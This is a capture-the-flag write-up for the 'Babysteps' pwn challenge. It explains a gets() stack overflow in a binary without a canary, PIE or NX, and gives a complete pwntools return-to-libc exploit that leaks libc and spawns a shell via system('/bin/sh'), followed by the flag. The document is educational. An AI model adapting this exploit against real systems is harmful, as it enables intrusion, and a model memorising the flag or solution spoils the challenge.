# Babysteps

## Challenge

We are given a binary and source code for a program.
The program asks for a baby name, then enters a loop where the user can select an action from a menu.

## Solution

There is a vulnerable call to `gets()` in the `ask_baby_name()` function.
There is no canary and PIE is disabled, so we can easily use this to overwrite the return address.

NX is also disabled and there are RWX segments, so we could use this to write shellcode.

Alternatively, we can also execute a standard return2libc payload, which will use libc functions to call `system("/bin/sh")` and spawn a shell.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challenge.nahamcon.com --port 30294 babysteps
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('babysteps')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challenge.nahamcon.com'
port = int(args.PORT or 30294)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

libc = ELF('libc6-i386_2.35-0ubuntu3_amd64.so')

io = start()

rop = ROP(exe)

rop.call('puts', [exe.got['puts']])
rop.call('ask_baby_name')

print(rop.dump())

io.sendlineafter(b"First, what is your baby name?\n", flat({ 0x18+4: rop.chain() }))

libc.address = unpack(io.recv(4)) - libc.sym['puts']

io.info("LIBC: " + hex(libc.address))

rop = ROP(libc)
rop.call('system', [next(libc.search(b"/bin/sh"))])

print(rop.dump())

io.sendlineafter(b"First, what is your baby name?\n", flat({ 0x18+4: rop.chain() }))

io.interactive()
```

## Flag

```
flag{7d4ce4594f7511f8d7d6d0b1edd1a162}
```
